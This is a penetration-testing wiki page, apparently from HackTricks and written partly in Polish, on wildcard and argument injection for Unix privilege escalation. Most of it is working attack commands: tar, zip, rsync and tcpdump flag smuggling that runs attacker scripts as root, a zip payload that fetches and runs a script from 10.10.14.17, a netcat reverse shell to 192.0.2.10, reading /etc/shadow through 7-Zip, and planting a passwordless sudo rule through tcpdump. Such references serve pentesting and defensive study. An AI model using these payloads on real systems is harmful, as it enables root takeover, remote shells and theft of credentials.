# Wildcards — Przydatne sztuczki

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (aka *glob*) **argument injection** występuje, gdy uprzywilejowany skrypt uruchamia binarkę Unixową taką jak `tar`, `chown`, `rsync`, `zip`, `7z`, … z niezacytowanym wildcardem takim jak `*`.
> Ponieważ shell rozwija wildcard **przed** uruchomieniem binarki, atakujący, który może tworzyć pliki w katalogu roboczym, może przygotować nazwy plików zaczynające się od `-`, tak że będą interpretowane jako **opcje zamiast danych**, efektywnie przemycając dowolne flagi lub nawet polecenia.
> Ta strona zbiera najprzydatniejsze prymitywy, najnowsze badania i nowoczesne detekcje na lata 2023–2025.

## chown / chmod

Możesz **skopiować właściciela/grupę lub bity uprawnień dowolnego pliku** wykorzystując flagę `--reference`:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Gdy root później uruchomi coś takiego:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` jest wstrzyknięte, powodując, że *wszystkie* dopasowane pliki dziedziczą właściciela/uprawnienia z `/root/secret``file`.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack).
Zobacz także klasyczny artykuł DefenseCode, aby uzyskać szczegóły.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Wykonaj dowolne polecenia, nadużywając funkcji **checkpoint**:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Gdy root uruchomi np. `tar -czf /root/backup.tgz *`, `shell.sh` zostanie wykonany jako root.

### bsdtar / macOS 14+

Domyślny `tar` w nowszych macOS (oparty na `libarchive`) *nie* implementuje `--checkpoint`, ale nadal możesz osiągnąć code-execution za pomocą flagi **--use-compress-program**, która pozwala określić zewnętrzny kompresor.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Gdy uprzywilejowany skrypt uruchomi `tar -cf backup.tar *`, zostanie uruchomiony `/bin/sh`.

---

## rsync

`rsync` pozwala zastąpić remote shell lub nawet remote binary za pomocą flag w wierszu poleceń zaczynających się od `-e` lub `--rsync-path`:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Jeśli root później zarchiwizuje katalog przy pomocy `rsync -az * backup:/srv/`, wstrzyknięta flaga uruchomi twoją powłokę po stronie zdalnej.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Nawet gdy uprzywilejowany skrypt *defensywnie* poprzedza wildcard `--` (aby zatrzymać parsowanie opcji), format 7-Zip obsługuje **file list files** przez poprzedzenie nazwy pliku znakiem `@`. Połączenie tego z symlinkiem pozwala ci *exfiltrate arbitrary files*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Jeśli root uruchamia coś takiego:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip spróbuje odczytać `root.txt` (→ `/etc/shadow`) jako listę plików i przerwie działanie, **wypisując zawartość na stderr**.

---

## zip

Istnieją dwa bardzo praktyczne prymitywy, gdy aplikacja przekazuje kontrolowane przez użytkownika nazwy plików do `zip` (albo poprzez wildcard, albo enumerując nazwy bez `--`).

- RCE przez test hook: `-T` włącza “test archive”, a `-TT <cmd>` zastępuje testera dowolnym programem (dłuższa forma: `--unzip-command <cmd>`). Jeśli możesz wstrzyknąć nazwy plików zaczynające się od `-`, rozdziel flagi na odrębne nazwy plików, żeby parsowanie krótkich opcji działało:
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Notes
- Nie próbuj używać pojedynczej nazwy pliku takiej jak `'-T -TT <cmd>'` — krótkie opcje są parsowane po pojedynczych znakach i to się nie uda. Użyj oddzielnych tokenów, jak pokazano.
- Jeśli aplikacja usuwa ukośniki ze ścieżek/nazw plików, pobierz z bezpośredniego hosta/IP (domyślna ścieżka `/index.html`) i zapisz lokalnie przy użyciu `-O`, a następnie uruchom.
- Możesz debugować parsowanie za pomocą `-sc` (pokaż przetworzone argv) lub `-h2` (więcej pomocy), aby zrozumieć, jak twoje tokeny są konsumowane.

Example (local behavior on zip 3.0):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: Jeśli warstwa webowa odzwierciedla stdout/stderr `zip` (częste przy naiwnych wrapperach), wstrzyknięte flagi takie jak `--help` lub błędy wynikające ze złych opcji pojawią się w odpowiedzi HTTP, potwierdzając command-line injection i ułatwiając strojenie payloadu.

---

## Dodatkowe binarki podatne na wildcard injection (2023-2025 quick list)

The following commands have been abused in modern CTFs and real environments.  The payload is always created as a *filename* inside a writable directory that will later be processed with a wildcard:

| Program | Flaga do nadużycia | Efekt |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Read file contents |
| `flock` | `-c <cmd>` | Execute command |
| `git`   | `-c core.sshCommand=<cmd>` | Command execution via git over SSH |
| `scp`   | `-S <cmd>` | Spawn arbitrary program instead of ssh |

These primitives are less common than the *tar/rsync/zip* classics but worth checking when hunting.

---

## tcpdump rotation hooks (-G/-W/-z): RCE via argv injection in wrappers

When a restricted shell or vendor wrapper builds a `tcpdump` command line by concatenating user-controlled fields (e.g., a "file name" parameter) without strict quoting/validation, you can smuggle extra `tcpdump` flags. The combo of `-G` (time-based rotation), `-W` (limit number of files), and `-z <cmd>` (post-rotate command) yields arbitrary command execution as the user running tcpdump (often root on appliances).

Preconditions:

- You can influence `argv` passed to `tcpdump` (e.g., via a wrapper like `/debug/tcpdump --filter=... --file-name=<HERE>`).
- The wrapper does not sanitize spaces or `-`-prefixed tokens in the file name field.

Klasyczny PoC (wykonuje reverse shell z zapisywalnej ścieżki):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Szczegóły:

- `-G 1 -W 1` wymusza natychmiastową rotację po pierwszym pasującym pakiecie.
- `-z <cmd>` uruchamia polecenie po rotacji raz na rotację. Wiele buildów wykonuje `<cmd> <savefile>`. Jeśli `<cmd>` jest skryptem/interpreterem, upewnij się, że obsługa argumentów pasuje do twojego payloadu.

Warianty bez wymiennych nośników:

- Jeśli masz jakikolwiek inny prymityw do zapisu plików (np. oddzielny command wrapper umożliwiający przekierowanie wyjścia), umieść swój skrypt w znanej ścieżce i wywołaj `-z /bin/sh /path/script.sh` lub `-z /path/script.sh` w zależności od semantyki platformy.
- Niektóre vendor wrappers rotują do lokalizacji kontrolowanych przez atakującego. Jeśli możesz wpłynąć na rotowaną ścieżkę (symlink/directory traversal), możesz skierować `-z`, aby wykonać zawartość, którą w pełni kontrolujesz bez użycia nośników zewnętrznych.

---

## sudoers: tcpdump with wildcards/additional args → arbitrary write/read and root

Bardzo powszechny antywzorzec w sudoers:
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Problemy
- Glob `*` i luźne wzorce ograniczają tylko pierwszy argument `-w`. `tcpdump` akceptuje wiele opcji `-w`; ostatnia ma zastosowanie.
- Reguła nie ogranicza innych opcji, więc `-Z`, `-r`, `-V` itp. są dozwolone.

Prymitywy
- Nadpisz ścieżkę docelową drugim `-w` (pierwszy tylko spełnia wymagania sudoers):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal wewnątrz pierwszego `-w`, aby uciec z ograniczonego drzewa:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Wymuś własność plików wyjściowych przy użyciu `-Z root` (tworzy pliki należące do root w dowolnym miejscu):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Zapis dowolnej zawartości przez odtworzenie spreparowanego PCAP przy użyciu `-r` (np. aby dodać linię do sudoers):

<details>
<summary>Utwórz PCAP, który zawiera dokładny ASCII payload i zapisz go jako root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- Odczyt dowolnego pliku/secret leak za pomocą `-V <file>` (interprets a list of savefiles). Diagnostyka błędów często wypisuje linie, leaking content:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## Źródła

- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)

{{#include ../../banners/hacktricks-training.md}}
